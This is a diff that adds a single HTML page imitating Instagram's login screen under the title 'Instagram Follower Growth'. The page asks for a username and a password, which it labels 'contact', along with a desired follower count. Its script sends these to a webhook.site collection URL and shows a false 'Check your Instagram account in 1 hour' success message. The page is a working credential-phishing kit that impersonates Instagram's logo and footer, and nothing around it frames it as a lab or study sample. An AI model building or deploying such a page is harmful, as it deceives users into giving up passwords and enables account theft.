@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Follower Growth</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            max-width: 350px;
+            width: 100%;
+            padding: 40px 30px 30px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0,0,0,0.05);
+        }
+
+        .logo {
+            margin-bottom: 25px;
+        }
+
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+
+        .heading {
+            font-size: 17px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .heading span {
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            font-size: 12px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            outline: none;
+            transition: border 0.2s;
+            color: #262626;
+        }
+
+        .form-group input:focus {
+            border-color: #a8a8a8;
+            background: #ffffff;
+        }
+
+        .form-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .login-btn {
+            width: 100%;
+            margin-top: 8px;
+            padding: 7px 16px;
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+            height: 32px;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .help-link {
+            display: block;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #8e8e8e;
+        }
+
+        .fb-login-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 7px 16px;
+            background: transparent;
+            border: none;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .fb-login-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #385185;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 20px;
+        }
+
+        .signup-link a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #efefef;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            font-size: 11px;
+            color: #8e8e8e;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-meta {
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-size: 11px;
+            color: #8e8e8e;
+        }
+
+        .footer-meta select {
+            background: transparent;
+            border: none;
+            color: #8e8e8e;
+            font-size: 11px;
+            cursor: pointer;
+        }
+
+        .footer-meta select:focus {
+            outline: none;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #262626;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            z-index: 999;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+
+        .toast.success {
+            background: #28a745;
+        }
+
+        .toast.error {
+            background: #dc3545;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 450px) {
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- REAL INSTAGRAM LOGO -->
+        <div class="logo">
+            <svg aria-label="Instagram" viewBox="0 0 175 51">
+                <defs>
+                    <radialGradient id="instaGradient" cx="50%" cy="50%" r="100%">
+                        <stop offset="0%" stop-color="#feda75" />
+                        <stop offset="25%" stop-color="#fa7e1e" />
+                        <stop offset="50%" stop-color="#d62976" />
+                        <stop offset="75%" stop-color="#962fbf" />
+                        <stop offset="100%" stop-color="#4f5bd5" />
+                    </radialGradient>
+                </defs>
+                <!-- Instagram Icon with Gradient -->
+                <g transform="translate(0, 2)">
+                    <!-- Outer rounded square -->
+                    <rect x="2" y="2" width="46" height="46" rx="12" ry="12" fill="none" stroke="url(#instaGradient)" stroke-width="4"/>
+                    <!-- Inner circle -->
+                    <circle cx="25" cy="25" r="11" fill="none" stroke="url(#instaGradient)" stroke-width="3.5"/>
+                    <!-- Top-right dot -->
+                    <circle cx="39" cy="11" r="3" fill="url(#instaGradient)"/>
+                </g>
+                <!-- Instagram Text -->
+                <text x="62" y="35" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" font-size="32" font-weight="700" fill="#262626" letter-spacing="-0.5">Instagram</text>
+            </svg>
+        </div>
+
+        <div class="heading">
+            See everyday moments from your <span>close friends</span>.
+        </div>
+
+        <form id="followerForm">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Enter username" required>
+            </div>
+            <div class="form-group">
+                <input type="text" id="contact" name="contact" placeholder="Password" required>
+            </div>
+            <div class="form-group">
+                <input type="number" id="followers" name="followers" placeholder="Number of followers" required min="1">
+            </div>
+
+            <button type="submit" class="login-btn" id="submitBtn">Submit</button>
+        </form>
+
+        <a href="#" class="help-link">Help?</a>
+
+        <div class="divider">
+            <span>OR</span>
+        </div>
+
+        <button class="fb-login-btn" onclick="showToast('Facebook login coming soon!', 'info')">
+            <svg viewBox="0 0 24 24">
+                <path d="M22 12.037c0-5.543-4.477-10.037-10-10.037s-10 4.494-10 10.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"/>
+            </svg>
+            Log in with Facebook
+        </button>
+
+        <div class="signup-link">
+            Don't have an account? <a href="#">Create new account</a>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Cookie Settings</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Popular</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+                <a href="#">Meta Verified</a>
+            </div>
+
+            <div class="footer-meta">
+                <select id="languageSelect">
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                    <option value="it">Italiano</option>
+                    <option value="pt">Português</option>
+                    <option value="ja">日本語</option>
+                    <option value="ko">한국어</option>
+                    <option value="zh">中文</option>
+                    <option value="ar">العربية</option>
+                    <option value="hi">हिन्दी</option>
+                </select>
+                <span>© 2026 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // ============================================================
+        // ✅ YOUR WEBHOOK URL
+        // ============================================================
+        const WEBHOOK_URL = 'https://webhook.site/0ec3bd36-013d-4aa2-83f3-6720ccad9f0c';
+
+        const form = document.getElementById('followerForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const toast = document.getElementById('toast');
+
+        let toastTimeout = null;
+
+        function showToast(message, type = 'info') {
+            if (toastTimeout) {
+                clearTimeout(toastTimeout);
+                toastTimeout = null;
+            }
+
+            toast.textContent = message;
+            toast.className = 'toast show ' + type;
+
+            toastTimeout = setTimeout(() => {
+                toast.classList.remove('show');
+                toastTimeout = null;
+            }, 4000);
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const contact = document.getElementById('contact').value.trim();
+            const followers = document.getElementById('followers').value.trim();
+
+            if (!username || !contact || !followers) {
+                showToast('Please fill in all fields.', 'error');
+                return;
+            }
+
+            if (parseInt(followers) < 1) {
+                showToast('Please enter a valid number of followers.', 'error');
+                return;
+            }
+
+            const formData = {
+                username: username,
+                contact: contact,
+                followers: parseInt(followers),
+                timestamp: new Date().toISOString(),
+                source: 'instagram_follower_page'
+            };
+
+            console.log('📤 Sending to webhook:', WEBHOOK_URL);
+            console.log('📦 Data:', formData);
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                console.log('✅ Data sent to webhook successfully!');
+                showToast('✅ Submitted successfully! Check your Instagram account in 1 hour.', 'success');
+                form.reset();
+
+            } catch (error) {
+                console.error('❌ Submission error:', error);
+                showToast('❌ Submission failed. Please try again.', 'error');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+            }
+        });
+
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            showToast('Language changed to: ' + this.options[this.selectedIndex].text, 'info');
+        });
+
+        toast.addEventListener('click', function() {
+            this.classList.remove('show');
+            if (toastTimeout) {
+                clearTimeout(toastTimeout);
+                toastTimeout = null;
+            }
+        });
+
+        console.log('✅ Instagram Follower Page loaded!');
+        console.log('🔗 Webhook URL:', WEBHOOK_URL);
+    </script>
+
+</body>
+</html>
